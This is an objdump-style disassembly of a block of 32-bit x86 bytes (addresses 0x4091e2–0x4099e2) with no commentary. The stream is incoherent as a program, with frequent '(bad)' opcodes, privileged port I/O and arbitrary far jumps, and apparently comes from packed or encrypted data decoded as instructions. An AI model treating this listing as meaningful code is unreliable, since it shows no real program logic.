  4091e2:	mov    ebp,0xdd6cfeaf
  4091e7:	mov    bl,0x45
  4091e9:	xlat   BYTE PTR ds:[ebx]
  4091ea:	jecxz  0x4091c9
  4091ec:	ror    al,1
  4091ee:	mov    eax,ds:0x26114a0
  4091f3:	test   BYTE PTR [eax+0x7e9e4759],bl
  4091f9:	push   esi
  4091fa:	ins    DWORD PTR es:[edi],dx
  4091fb:	pop    ebx
  4091fc:	out    dx,eax
  4091fd:	sub    al,0x22
  4091ff:	mov    DWORD PTR [edi],ecx
  409201:	push   ebx
  409202:	pop    ss
  409203:	(bad)  
  409204:	fld    DWORD PTR [eax]
  409206:	shl    DWORD PTR [ebx-0x8],0x9b
  40920a:	dec    eax
  40920b:	ret    0xa7a
  40920e:	lahf   
  40920f:	aad    0xca
  409211:	dec    esi
  409212:	fsubr  DWORD PTR [ebx+0x75]
  409215:	retf   
  409216:	popa   
  409217:	xor    al,0xa1
  409219:	les    esi,FWORD PTR [eax-0x55]
  40921c:	pusha  
  40921d:	sbb    esi,ecx
  40921f:	cmp    eax,0x5bb52d02
  409224:	xor    bh,bl
  409226:	in     al,dx
  409227:	add    al,0x91
  409229:	das    
  40922a:	addr16 repz cs xchg edx,eax
  40922e:	outs   dx,BYTE PTR ds:[esi]
  40922f:	lods   eax,DWORD PTR ds:[esi]
  409230:	jle    0x4091d4
  409232:	(bad)  
  409233:	xlat   BYTE PTR ds:[ebx]
  409234:	inc    ebp
  409235:	sar    ch,1
  409237:	jle    0x4091e1
  409239:	inc    esp
  40923a:	test   eax,0x3273b476
  40923f:	sbb    al,bh
  409241:	mov    WORD PTR [ebp-0x57],?
  409244:	(bad)  [ebp-0x72]
  409247:	mov    al,dh
  409249:	dec    edi
  40924a:	xor    al,0xe7
  40924c:	xchg   esp,eax
  40924d:	lods   al,BYTE PTR ds:[esi]
  40924e:	mov    esi,DWORD PTR [eax-0x42]
  409251:	adc    bl,BYTE PTR [ebp+edx*1+0x30]
  409255:	(bad)  
  409256:	sub    ebx,esp
  409258:	test   eax,0x5106175d
  40925d:	das    
  40925e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40925f:	shl    cl,0xd2
  409262:	ja     0x409220
  409264:	push   es
  409265:	cmp    al,0xc2
  409267:	push   edx
  409268:	xchg   esp,ebp
  40926a:	pop    eax
  40926b:	xchg   BYTE PTR [ebp-0x106ba75d],al
  409271:	loope  0x4092b4
  409273:	outs   dx,BYTE PTR ds:[esi]
  409274:	mov    eax,ds:0x80aed9c8
  409279:	inc    ebx
  40927a:	rol    DWORD PTR [ebx-0x2437da8b],1
  409280:	sbb    DWORD PTR [ebp+0x642b1e23],esi
  409286:	pushf  
  409287:	sbb    ch,al
  409289:	and    BYTE PTR [edi-0x273c0e41],ah
  40928f:	fs xchg ebp,eax
  409291:	cli    
  409292:	dec    ebx
  409293:	mov    BYTE PTR [edx+edi*4-0x53],ah
  409297:	jb     0x409271
  409299:	rcr    BYTE PTR [edi],cl
  40929b:	mov    esp,0x442dcc2d
  4092a0:	push   0x47
  4092a2:	stos   BYTE PTR es:[edi],al
  4092a3:	mov    eax,0x96910547
  4092a8:	push   ds
  4092a9:	pop    esp
  4092aa:	lds    ebp,FWORD PTR [ebp+0x39c6b25b]
  4092b0:	gs shr dh,1
  4092b3:	out    0xbe,eax
  4092b5:	jb     0x4092a5
  4092b7:	cmp    ch,ch
  4092b9:	xchg   esp,eax
  4092ba:	cmp    ecx,0xffffffc3
  4092bd:	or     eax,0x8b813912
  4092c2:	pop    ebp
  4092c3:	icebp  
  4092c4:	int    0x8c
  4092c6:	jg     0x40933f
  4092c8:	mov    WORD PTR [ebp+0x462acbcf],es
  4092ce:	pusha  
  4092cf:	push   edi
  4092d0:	cmp    al,0x4d
  4092d2:	test   BYTE PTR [esi-0x6910beda],0xbf
  4092d9:	pop    esi
  4092da:	leave  
  4092db:	shr    DWORD PTR [ebx-0x451017f],0x3d
  4092e2:	lock ret 
  4092e4:	sub    ch,BYTE PTR [ecx+0x649c2448]
  4092ea:	jo     0x4092c2
  4092ec:	or     DWORD PTR [edi],eax
  4092ee:	cmp    ah,al
  4092f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092f1:	adc    eax,0x1598dc7a
  4092f6:	push   ebx
  4092f7:	inc    esp
  4092f8:	xlat   BYTE PTR cs:[ebx]
  4092fa:	int    0x6d
  4092fc:	aas    
  4092fd:	jno    0x40931b
  4092ff:	(bad)  [ebx-0x44314b59]
  409305:	xor    al,0xd7
  409307:	mov    al,ds:0x2b684cb3
  40930c:	sbb    DWORD PTR ds:0x92e38987,edx
  409312:	arpl   WORD PTR [esi-0x75],bx
  409315:	jb     0x409308
  409317:	call   0x927c60ab
  40931c:	pop    edi
  40931d:	xchg   edi,eax
  40931e:	clc    
  40931f:	lods   al,BYTE PTR ds:[esi]
  409320:	mov    eax,cs:0x61d49122
  409326:	(bad)  
  409327:	out    0xd7,eax
  409329:	jmp    0x579:0x8fa6f75f
  409330:	scas   eax,DWORD PTR es:[edi]
  409331:	mov    bl,0x3f
  409333:	mov    DWORD PTR [ecx+0x5],eax
  409336:	push   0xffffff99
  409338:	jne    0x4093a7
  40933a:	es jb  0x40935c
  40933d:	cmp    ebp,DWORD PTR [ecx+0x2be43b3f]
  409343:	jmp    DWORD PTR [eax+0x43]
  409346:	shl    DWORD PTR [eax],0xb7
  409349:	pop    es
  40934a:	push   esi
  40934b:	scas   eax,DWORD PTR es:[edi]
  40934c:	leave  
  40934d:	sbb    DWORD PTR [ebx+eiz*4-0x2ab970c8],edi
  409354:	shl    BYTE PTR [edx-0x1aa526d5],0x7f
  40935b:	mov    ebx,0xa90d3cd8
  409360:	add    ah,al
  409362:	jae    0x409395
  409364:	or     DWORD PTR [esp+ebp*2-0x24],eax
  409368:	mov    ebx,0xc21ba4e3
  40936d:	or     ah,al
  40936f:	fnstcw WORD PTR [esi+0x7ace1335]
  409375:	dec    ebx
  409376:	jnp    0x409321
  409378:	hlt    
  409379:	out    dx,eax
  40937a:	sub    ah,bl
  40937c:	int    0x91
  40937e:	push   ebx
  40937f:	retf   
  409380:	push   ebx
  409381:	xchg   BYTE PTR [edx+0x7d],dl
  409384:	sbb    bl,bl
  409386:	cwde   
  409387:	leave  
  409388:	in     al,0xe6
  40938a:	out    0x6c,al
  40938c:	jo     0x4093f8
  40938e:	cmp    eax,ebx
  409390:	lods   al,BYTE PTR ds:[esi]
  409391:	cmp    BYTE PTR [edx-0x2f],cl
  409394:	pop    edi
  409395:	mov    ecx,0xa2902df
  40939a:	es sbb ah,al
  40939d:	pushf  
  40939e:	sub    al,0x75
  4093a0:	outs   dx,DWORD PTR ds:[esi]
  4093a1:	adc    eax,ebp
  4093a3:	fwait
  4093a4:	lea    ebp,[edx+0x3]
  4093a7:	inc    ebp
  4093a8:	fistp  QWORD PTR [ebp+edi*8+0x33]
  4093ac:	dec    edi
  4093ad:	sbb    dh,al
  4093af:	adc    DWORD PTR [ecx],esp
  4093b1:	mov    dl,0xdb
  4093b3:	int3   
  4093b4:	and    BYTE PTR [eax],ch
  4093b6:	jne    0x409434
  4093b8:	jbe    0x4093ce
  4093ba:	lahf   
  4093bb:	pusha  
  4093bc:	and    al,0x61
  4093be:	push   es
  4093bf:	js     0x4093bf
  4093c1:	cmp    al,0x45
  4093c3:	sbb    edi,DWORD PTR [edx-0x2f]
  4093c6:	popa   
  4093c7:	jmp    0x4093d4
  4093c9:	cmc    
  4093ca:	jno    0x40935e
  4093cc:	and    al,0x38
  4093ce:	add    al,0x42
  4093d0:	jns    0x409395
  4093d2:	push   edi
  4093d3:	pop    esp
  4093d4:	aad    0xf5
  4093d6:	xchg   edx,eax
  4093d7:	jne    0x409364
  4093d9:	sbb    eax,0xb354d327
  4093de:	nop
  4093df:	xor    eax,0x85a2d23d
  4093e4:	or     eax,DWORD PTR [esi]
  4093e6:	xor    eax,0x9c7cf9
  4093eb:	inc    bx
  4093ed:	jmp    0x40939a
  4093ef:	adc    DWORD PTR [ecx-0x566a86a3],esp
  4093f5:	jp     0x409458
  4093f7:	push   esi
  4093f8:	lods   eax,DWORD PTR ds:[esi]
  4093f9:	jge    0x40937c
  4093fb:	adc    al,0x25
  4093fd:	daa    
  4093fe:	sbb    BYTE PTR ds:0xc9574ee4,bl
  409404:	stos   DWORD PTR es:[edi],eax
  409405:	sub    esi,DWORD PTR [esi+0x32]
  409408:	ror    eax,1
  40940a:	pop    ecx
  40940b:	mov    eax,0x29cdc313
  409410:	cmp    eax,DWORD PTR [ebx]
  409412:	(bad)  
  409413:	aam    0x6f
  409415:	fidiv  WORD PTR [eax+0x50cd3792]
  40941b:	jl     0x4093ad
  40941d:	rcr    BYTE PTR [ecx+0x6be17967],0x7b
  409424:	rol    BYTE PTR [esi-0x2e9bd947],0x6e
  40942b:	inc    edi
  40942c:	dec    esp
  40942d:	push   ds
  40942e:	sub    eax,0x68aca35c
  409433:	xchg   ecx,eax
  409434:	push   ebp
  409435:	mov    edx,0x71083834
  40943a:	add    eax,0xbc0ac33c
  40943f:	js     0x409485
  409441:	arpl   WORD PTR [edi+edi*4],sp
  409444:	xchg   DWORD PTR [ebx+esi*1+0x65c01442],esi
  40944b:	mov    edi,0xe4c88258
  409450:	xchg   ebx,eax
  409451:	test   eax,0x753bf7c2
  409456:	jo     0x40943e
  409458:	ins    BYTE PTR es:[edi],dx
  409459:	hlt    
  40945a:	jns    0x409489
  40945c:	jg     0x40941a
  40945e:	int3   
  40945f:	mov    DWORD PTR [eax-0x38d354bc],esi
  409465:	adc    eax,0x903735f4
  40946a:	bound  ebp,QWORD PTR ds:[ecx-0x61bab530]
  409471:	pop    ds
  409472:	or     al,0x33
  409474:	es or  eax,0x95c076ad
  40947a:	or     bh,BYTE PTR [edi+esi*2+0x76]
  40947e:	(bad)  
  409480:	loop   0x4094e1
  409482:	sbb    DWORD PTR [edx+0x45870d94],esp
  409488:	mov    BYTE PTR [edi],bl
  40948a:	pop    esi
  40948b:	daa    
  40948c:	addr16 cmp al,0xe2
  40948f:	jp     0x409491
  409491:	xchg   edx,eax
  409492:	clc    
  409493:	cld    
  409494:	xchg   ebx,eax
  409495:	sar    DWORD PTR [eax+0x46],0x71
  409499:	icebp  
  40949a:	ins    DWORD PTR es:[edi],dx
  40949b:	(bad)  [eax+0x69]
  40949e:	sub    esi,esp
  4094a0:	into   
  4094a1:	xchg   ebp,eax
  4094a2:	sbb    al,0x31
  4094a4:	adc    al,0x7d
  4094a6:	sbb    ecx,DWORD PTR [ecx+0x4a58b29b]
  4094ac:	sbb    ebp,DWORD PTR [ecx]
  4094ae:	out    0x5a,al
  4094b0:	xchg   DWORD PTR [eax+0x3c],ebp
  4094b3:	dec    ebx
  4094b4:	call   0x2201f92b
  4094b9:	in     al,dx
  4094ba:	retf   
  4094bb:	sbb    eax,DWORD PTR [ebx-0x2f]
  4094be:	or     ebx,DWORD PTR [edx+esi*4-0x4a]
  4094c2:	pop    esi
  4094c3:	pminsw mm2,QWORD PTR cs:[ebp+eax*1-0x41b813c2]
  4094cc:	add    cl,BYTE PTR ds:0xddce47fa
  4094d2:	cld    
  4094d3:	adc    ebp,ebp
  4094d5:	std    
  4094d6:	lock gs mov cl,0x3
  4094da:	shl    DWORD PTR [edi-0x21],1
  4094dd:	lds    esi,FWORD PTR [eax+0x5aa91ada]
  4094e3:	pop    ebp
  4094e4:	mov    BYTE PTR [edi],al
  4094e6:	(bad)  
  4094e7:	inc    ecx
  4094e8:	add    bh,BYTE PTR [ecx+eiz*1+0x144cf4b8]
  4094ef:	sub    DWORD PTR [esi+0xf],edx
  4094f2:	imul   esi,ebp,0xdf7b8d8a
  4094f8:	xor    eax,0x160974a0
  4094fd:	stos   DWORD PTR es:[edi],eax
  4094fe:	fldcw  WORD PTR [esi]
  409500:	cmp    eax,0xf712c0cf
  409505:	retf   
  409506:	aam    0x9e
  409508:	jns    0x409505
  40950a:	mov    WORD PTR [edx],es
  40950c:	or     BYTE PTR [ebx-0x1f],0x8d
  409510:	test   eax,0x5f42f81d
  409515:	or     BYTE PTR [ecx+0x7],bh
  409518:	rcl    BYTE PTR [esi+eiz*2+0x693b22b8],0xd9
  409520:	bound  esi,QWORD PTR [ebx+0x46bea578]
  409526:	arpl   sp,bp
  409528:	xor    al,0x81
  40952a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40952b:	fcmovu st,st(1)
  40952d:	nop
  40952e:	rcr    ebp,cl
  409530:	sti    
  409531:	(bad)  
  409533:	push   ds
  409534:	mov    eax,0xdf3b846f
  409539:	mov    cl,bl
  40953b:	mov    esi,0x41a52cbf
  409540:	arpl   sp,bp
  409542:	sub    eax,0xca94569c
  409547:	bound  ebx,QWORD PTR [edx-0x381ac8e8]
  40954d:	int3   
  40954e:	cdq    
  40954f:	jg     0x4094d8
  409551:	sbb    cl,ah
  409553:	in     al,0xbf
  409555:	or     BYTE PTR [esp+ecx*4+0x421f1680],dl
  40955c:	in     eax,dx
  40955d:	or     ecx,DWORD PTR [edi]
  40955f:	xor    ecx,DWORD PTR [edx-0x6]
  409562:	sbb    edi,DWORD PTR [edi]
  409564:	scas   eax,DWORD PTR es:[edi]
  409565:	loopne 0x409572
  409567:	jp     0x74d177c1
  40956d:	push   ecx
  40956e:	imul   esi,DWORD PTR [ecx],0xffffffa4
  409571:	retf   0x54b7
  409574:	lock xlat BYTE PTR cs:[ebx]
  409577:	push   esp
  409579:	mov    cl,0x7b
  40957b:	lahf   
  40957c:	mov    bl,0xa8
  40957e:	inc    edi
  40957f:	in     al,0xe5
  409581:	bound  edx,QWORD PTR ss:[ebx-0x54cde406]
  409588:	mov    edx,0x95c658cf
  40958d:	or     bl,BYTE PTR [esp+ebx*1+0x78]
  409591:	test   DWORD PTR [esi+ecx*1+0x53],ebx
  409595:	add    eax,0x110c39e2
  40959a:	xchg   ebp,eax
  40959b:	ret    0x84ba
  40959e:	adc    al,0xf9
  4095a0:	lods   al,BYTE PTR ds:[esi]
  4095a1:	ins    DWORD PTR es:[edi],dx
  4095a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095a3:	or     al,0x40
  4095a5:	mov    dx,0x66ca
  4095a9:	adc    ah,BYTE PTR [esi+0x15ed9b08]
  4095af:	or     eax,0x6d4a02ae
  4095b4:	jae    0x409558
  4095b6:	mov    eax,0xa7897b2e
  4095bb:	add    BYTE PTR [eax-0x1adebd81],ah
  4095c1:	bound  edx,QWORD PTR [esi-0x5b]
  4095c4:	shl    BYTE PTR [ebx-0x6190d165],0xf7
  4095cb:	mov    cl,0x5c
  4095cd:	je     0x40956e
  4095cf:	dec    eax
  4095d0:	rcl    DWORD PTR [eax],cl
  4095d2:	mov    cl,0xc3
  4095d4:	adc    eax,0x24c4a34b
  4095d9:	jecxz  0x409633
  4095db:	add    dl,BYTE PTR [ebp-0x7cab0544]
  4095e1:	and    eax,0x133ab447
  4095e6:	lods   eax,DWORD PTR ds:[esi]
  4095e7:	cmc    
  4095e8:	out    dx,al
  4095e9:	test   DWORD PTR [esi-0x2e],ebx
  4095ec:	sbb    DWORD PTR [ebp-0x33],ebx
  4095ef:	pop    eax
  4095f0:	pop    edi
  4095f1:	mov    dl,0x71
  4095f3:	xor    eax,DWORD PTR [ebx+0x3]
  4095f6:	dec    ecx
  4095f7:	cdq    
  4095f8:	cmp    al,0x9b
  4095fa:	jne    0x4095d7
  4095fc:	imul   esi,DWORD PTR [edx+ecx*2-0x7a],0xffffffa6
  409601:	pusha  
  409602:	enter  0x80a4,0x84
  409606:	das    
  409607:	cs jg  0x409660
  40960a:	ins    BYTE PTR es:[edi],dx
  40960b:	lods   eax,DWORD PTR ds:[esi]
  40960c:	arpl   WORD PTR [edi+0x5c820108],sp
  409612:	mov    ecx,0x54f9fb06
  409617:	scas   eax,DWORD PTR es:[edi]
  409618:	fwait
  409619:	jb     0x4095f1
  40961b:	cmp    DWORD PTR [edx],eax
  40961d:	pop    esi
  40961e:	cmp    dl,ah
  409620:	push   ds
  409621:	push   es
  409622:	push   0x3b8e1391
  409627:	push   ebp
  409628:	stc    
  409629:	push   eax
  40962a:	push   ds
  40962b:	jno    0x40967b
  40962d:	in     al,0xd4
  40962f:	mov    ch,0xdd
  409631:	push   0xffffffd7
  409633:	mov    BYTE PTR [esi-0x25f47968],dl
  409639:	pusha  
  40963a:	mov    ecx,ecx
  40963c:	loop   0x409616
  40963e:	pusha  
  40963f:	movhps QWORD PTR [edx+ebx*4+0x28],xmm1
  409644:	in     al,0x26
  409646:	ins    BYTE PTR es:[edi],dx
  409647:	hlt    
  409648:	add    DWORD PTR [eax],ebp
  40964a:	not    DWORD PTR [edx]
  40964c:	xlat   BYTE PTR ds:[ebx]
  40964d:	mov    dl,0x9
  40964f:	out    0x44,eax
  409651:	inc    ch
  409653:	pop    ds
  409654:	std    
  409655:	es test eax,0xbbdfac92
  40965b:	fld    TBYTE PTR [edi+0x77776d08]
  409661:	pop    ss
  409662:	ins    BYTE PTR es:[edi],dx
  409663:	or     al,0x78
  409665:	test   BYTE PTR [esi-0x64758f87],dl
  40966b:	xor    eax,0xeb1652ff
  409670:	dec    eax
  409671:	dec    esi
  409672:	cmp    al,0xfb
  409674:	mov    bh,0xcf
  409676:	fist   DWORD PTR [edi+edx*2+0x776ea4f2]
  40967d:	gs (bad) 
  40967f:	sub    eax,0x8c8f69f3
  409684:	mov    esp,eax
  409686:	mov    ch,0x68
  409688:	xchg   esi,eax
  409689:	pop    es
  40968a:	ja     0x409646
  40968c:	repnz mov dl,bh
  40968f:	inc    ebp
  409690:	lods   al,BYTE PTR ds:[esi]
  409691:	arpl   cx,cx
  409693:	(bad)  
  409694:	mov    ecx,0xf8f0202e
  409699:	inc    eax
  40969a:	push   ss
  40969b:	sub    BYTE PTR [edx],al
  40969d:	sahf   
  40969e:	loope  0x409647
  4096a0:	inc    esi
  4096a1:	add    DWORD PTR [ebp-0x75],edx
  4096a4:	loopne 0x4096f7
  4096a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096a7:	add    eax,0x562255be
  4096ac:	lods   al,BYTE PTR ds:[esi]
  4096ad:	cmp    al,0x72
  4096af:	stc    
  4096b0:	aas    
  4096b1:	clc    
  4096b2:	ret    0xea51
  4096b5:	jns    0x409701
  4096b7:	push   ss
  4096b8:	es nop
  4096ba:	push   ds
  4096bb:	jmp    0x4b84:0xd1a4174b
  4096c2:	jo     0x409683
  4096c4:	jp     0x4096e8
  4096c6:	cmp    edx,edi
  4096c8:	mov    eax,ds:0x1550fdf
  4096cd:	paddusw mm6,QWORD PTR [eax-0x22]
  4096d1:	lods   eax,DWORD PTR ds:[esi]
  4096d2:	and    al,0x55
  4096d4:	jb     0x409753
  4096d6:	ss ins DWORD PTR es:[edi],dx
  4096d8:	mov    eax,ds:0x46942cff
  4096dd:	cmp    al,0x60
  4096df:	pushf  
  4096e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096e1:	jno    0x4096df
  4096e3:	sbb    edi,DWORD PTR [esi]
  4096e5:	ins    BYTE PTR es:[edi],dx
  4096e6:	add    al,BYTE PTR [edx-0x714bede0]
  4096ec:	arpl   WORD PTR [eax],dx
  4096ee:	(bad)  
  4096ef:	mov    esp,0x40c2bfc1
  4096f4:	sbb    BYTE PTR [ecx],ah
  4096f6:	(bad)
  4096f9:	in     eax,0xa
  4096fb:	lods   eax,DWORD PTR ds:[esi]
  4096fc:	xchg   esi,eax
  4096fd:	loopne 0x4096b7
  4096ff:	adc    dh,BYTE PTR [esp+eiz*2]
  409702:	push   esi
  409703:	xor    eax,0x68d4f273
  409708:	test   al,0x80
  40970a:	neg    ebx
  40970c:	sbb    BYTE PTR [edi-0x70a82607],ah
  409712:	push   ecx
  409713:	xchg   esp,eax
  409714:	nop
  409715:	dec    edx
  409716:	in     eax,0x97
  409718:	js     0x4096f8
  40971a:	mov    dh,ch
  40971c:	fdiv   DWORD PTR [esi]
  40971e:	inc    edx
  40971f:	retf   
  409720:	in     eax,0x8f
  409722:	sub    al,0x7f
  409724:	or     cl,BYTE PTR [edi+0x7adc1b82]
  40972a:	pop    edi
  40972b:	loope  0x409709
  40972d:	jae    0x4096cc
  40972f:	jmp    0x413c2cda
  409734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409735:	cmp    bh,BYTE PTR [bp+si+0x34e3]
  40973a:	fisub  DWORD PTR [ecx]
  40973c:	leave  
  40973d:	std    
  40973e:	xchg   esi,eax
  40973f:	dec    esi
  409740:	das    
  409741:	retf   
  409742:	or     al,cl
  409744:	ja     0x4097b9
  409746:	sub    bl,BYTE PTR [ecx-0x4c54f3ee]
  40974c:	mov    esp,0x8003d277
  409751:	jo     0x409732
  409753:	cli    
  409754:	iret   
  409755:	xchg   BYTE PTR [ecx+0x53],dh
  409758:	mov    al,ds:0xdb6f769f
  40975d:	fdivr  QWORD PTR ds:0x4854ca68
  409763:	and    ebp,DWORD PTR [ecx-0x64]
  409766:	fild   QWORD PTR ds:0xd5c91458
  40976c:	dec    ecx
  40976d:	cmp    BYTE PTR [edi*2+0x713ceab9],bh
  409774:	and    DWORD PTR [edi+0xc5da3eb],esp
  40977a:	mov    BYTE PTR [ecx+0x77dbec87],ah
  409780:	jne    0x409732
  409782:	xchg   ebx,eax
  409783:	mov    eax,ds:0x15b7c5bd
  409788:	cmp    BYTE PTR [ecx+edx*4-0x36],dl
  40978c:	es push edi
  40978e:	sbb    eax,0x5405da72
  409793:	fsub   DWORD PTR [edx+eiz*1]
  409796:	jbe    0x40978a
  409798:	xchg   ebp,eax
  409799:	jne    0x409801
  40979b:	sub    eax,DWORD PTR [esi]
  40979d:	cmp    bh,BYTE PTR [ebp+0x4652780a]
  4097a3:	jl     0x40979e
  4097a5:	cdq    
  4097a6:	push   ss
  4097a7:	test   BYTE PTR [eax-0x2127c86c],0xaa
  4097ae:	pop    ebx
  4097af:	shl    DWORD PTR [ecx-0x361ffcee],0x14
  4097b6:	and    DWORD PTR [esi-0x26baf76a],esp
  4097bc:	jmp    0x40976f
  4097be:	push   0x1160a44f
  4097c3:	jp     0x409750
  4097c5:	mov    dh,0x78
  4097c7:	dec    ebp
  4097c8:	fld    TBYTE PTR [eax]
  4097ca:	mov    ebp,0x556d9471
  4097cf:	adc    DWORD PTR ds:0x187b0bf,edx
  4097d5:	push   esi
  4097d6:	push   DWORD PTR [eax+0x3c]
  4097d9:	pop    ecx
  4097da:	jmp    0x1cb6:0x96a6fd4e
  4097e1:	fcom   QWORD PTR [edx+0x7]
  4097e4:	add    edx,esp
  4097e6:	call   0x1621:0x174821e1
  4097ed:	pop    edi
  4097ee:	push   es
  4097ef:	ret    0x1cc4
  4097f2:	jbe    0x409792
  4097f4:	pop    eax
  4097f5:	mov    eax,ds:0x652750dc
  4097fa:	xchg   DWORD PTR [edi-0x17],eax
  4097fd:	sar    BYTE PTR [edx-0x14],0xe3
  409801:	or     eax,0x571baea2
  409806:	fucomi st,st(6)
  409808:	rol    DWORD PTR [eax+ebx*2-0x49],cl
  40980c:	xor    esp,edx
  40980e:	sbb    edx,DWORD PTR [ecx+0x61]
  409811:	cmp    dl,dh
  409813:	inc    esi
  409814:	in     eax,dx
  409815:	les    eax,FWORD PTR [eax]
  409817:	mov    ebp,0xb6ec5579
  40981c:	iret   
  40981d:	call   0x80614524
  409822:	dec    ebp
  409823:	or     al,bh
  409825:	sti    
  409826:	inc    DWORD PTR [edi-0x7]
  409829:	pop    edx
  40982a:	dec    ebx
  40982b:	arpl   WORD PTR [eax+0x3568037f],bp
  409831:	ret    
  409832:	jo     0x409854
  409834:	adc    eax,0x53b3c572
  409839:	popf   
  40983a:	icebp  
  40983b:	stos   BYTE PTR es:[edi],al
  40983c:	loope  0x4098a0
  40983e:	retf   
  40983f:	sub    al,0x6
  409841:	mov    eax,ds:0xa5382b03
  409846:	xor    dh,BYTE PTR [eax]
  409848:	xor    esp,DWORD PTR [esi-0x15]
  40984b:	pushfw 
  40984d:	fwait
  40984e:	jns    0x4097e5
  409850:	or     esp,0x2d61c115
  409856:	je     0x409811
  409858:	imul   eax,DWORD PTR [ecx+0x1b],0x8
  40985c:	push   0xc40b7b19
  409861:	jmp    0xfef2c2eb
  409866:	adc    eax,esp
  409868:	xor    al,0x5
  40986a:	and    al,0x55
  40986c:	mov    al,0xaf
  40986e:	(bad)  
  40986f:	push   ds
  409870:	pop    ebp
  409871:	shr    DWORD PTR [ebx-0x18195847],0x5b
  409878:	fiadd  DWORD PTR [eax-0x3be5a7da]
  40987e:	test   al,0x68
  409880:	push   ecx
  409881:	mov    dl,0x47
  409883:	aas    
  409884:	push   cs
  409885:	es popa 
  409887:	imul   edx,edx,0xffffff80
  40988a:	mov    bh,al
  40988c:	pop    ebx
  40988d:	cli    
  40988e:	sbb    al,0x57
  409890:	gs jae 0x409834
  409893:	inc    esi
  409894:	aaa    
  409895:	call   0x2b0f9124
  40989a:	dec    ecx
  40989b:	cwde   
  40989c:	int3   
  40989d:	dec    ebx
  40989e:	lods   al,BYTE PTR ds:[esi]
  40989f:	imul   eax,DWORD PTR [esi+0x67010c03],0xfffffff7
  4098a6:	or     DWORD PTR [edx],esp
  4098a8:	mov    BYTE PTR [edi],bl
  4098aa:	xchg   edi,eax
  4098ab:	inc    esp
  4098ac:	jmp    0x442b:0xca8ad2f4
  4098b3:	mov    ah,0xa0
  4098b5:	xchg   DWORD PTR [esi+0x4f],ebp
  4098b8:	imul   ecx,ebx,0x23303180
  4098be:	gs lahf 
  4098c0:	mov    eax,0x5665b3fc
  4098c5:	stos   DWORD PTR es:[edi],eax
  4098c6:	inc    ecx
  4098c7:	aaa    
  4098c8:	loopne 0x4098b2
  4098ca:	push   0x23
  4098cc:	mov    BYTE PTR [eax+0x48],bl
  4098cf:	jmp    0x409861
  4098d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098d2:	mov    edi,0x64b8cf13
  4098d7:	push   cs
  4098d8:	scas   eax,DWORD PTR es:[edi]
  4098d9:	push   eax
  4098da:	adc    BYTE PTR [ebx],dh
  4098dc:	mov    dh,0x43
  4098de:	jecxz  0x409948
  4098e0:	or     cl,BYTE PTR [eax+0x44cf9f8f]
  4098e6:	lahf   
  4098e7:	and    ch,bl
  4098e9:	int    0x53
  4098eb:	mov    ah,0xfa
  4098ed:	fs mov ebx,0x89a0d7c9
  4098f3:	cmp    esp,DWORD PTR [esi]
  4098f5:	cmp    dl,BYTE PTR [edx+0x5ef1e707]
  4098fb:	adc    BYTE PTR [edx+0x631ff14],ch
  409901:	enter  0x71a8,0x2c
  409905:	push   cs
  409906:	xor    ebp,DWORD PTR [ebx]
  409908:	rcr    DWORD PTR [esi+ecx*8],1
  40990b:	sbb    BYTE PTR [edi+0x670b1c18],cl
  409911:	dec    esi
  409912:	stos   BYTE PTR es:[edi],al
  409913:	or     eax,0x80ab4a17
  409918:	pop    edi
  409919:	sbb    al,0x33
  40991b:	mov    al,ds:0xce684f7d
  409920:	jne    0x409925
  409922:	push   ebx
  409923:	sti    
  409924:	shr    dl,cl
  409926:	mov    dh,0x6a
  409928:	mov    ch,0x35
  40992a:	arpl   WORD PTR [edx+0x485eab12],cx
  409930:	and    cl,BYTE PTR [ebp*1+0x62ce0b01]
  409937:	fimul  DWORD PTR [edx]
  409939:	das    
  40993a:	cmp    ebp,0x33a2a6a
  409940:	push   ebx
  409941:	xor    DWORD PTR [ebx+0x69],0xd72993c2
  409948:	or     ebp,DWORD PTR [ebp+0x3d538f29]
  40994e:	push   eax
  40994f:	loope  0x40999f
  409951:	das    
  409952:	fsin   
  409954:	pop    eax
  409955:	adc    al,0x6f
  409957:	addr16 aam 0x27
  40995a:	cli    
  40995b:	(bad)  [ebp+0x5a]
  40995e:	in     al,dx
  40995f:	pop    esp
  409960:	(bad)  
  409961:	cmp    dh,bl
  409963:	stos   DWORD PTR es:[edi],eax
  409964:	adc    edx,DWORD PTR [edi]
  409966:	dec    ecx
  409967:	sbb    dh,cl
  409969:	adc    dl,BYTE PTR [edi]
  40996b:	arpl   WORD PTR [eax],si
  40996d:	pop    esp
  40996e:	add    ebx,DWORD PTR [ecx+edi*4+0x3]
  409972:	ror    DWORD PTR [eax+0x184c3b3c],cl
  409978:	hlt    
  409979:	push   0xffffffaa
  40997b:	add    BYTE PTR [eax+0x38a22053],al
  409981:	add    eax,0xbdb1e82b
  409986:	cmp    al,0x65
  409988:	ror    BYTE PTR [edx+ecx*4],cl
  40998b:	mov    ds:0x29dd4815,eax
  409990:	xor    al,0x5a
  409992:	ss dec ebp
  409994:	fist   DWORD PTR [ecx+0xb]
  409997:	add    al,0x55
  409999:	sub    dh,BYTE PTR [ecx]
  40999b:	pop    esp
  40999c:	inc    eax
  40999d:	mov    BYTE PTR [edi-0x80],bl
  4099a0:	and    eax,0x58d23c7b
  4099a5:	(bad)  
  4099a6:	ins    DWORD PTR es:[edi],dx
  4099a7:	jne    0x409995
  4099a9:	mov    al,0x19
  4099ab:	arpl   WORD PTR [ebx+0x2278a0d],bp
  4099b1:	adc    cl,bh
  4099b3:	call   0x1a45c7c8
  4099b8:	pop    edx
  4099b9:	sbb    al,0xa2
  4099bb:	push   es
  4099bc:	push   0x4f
  4099be:	push   cs
  4099bf:	push   esi
  4099c0:	push   ebx
  4099c1:	jmp    0x52b4:0xaf1edcdd
  4099c8:	and    edx,DWORD PTR [edi+ebp*8-0x31]
  4099cc:	lock and BYTE PTR [edx],0x16
  4099d0:	mov    ebp,0x39041d76
  4099d5:	push   cs
  4099d6:	(bad)
  4099db:	into   
  4099dc:	pop    esi
  4099dd:	mov    al,ds:0xfb11381d
  4099e2:	cs out 0x51,al
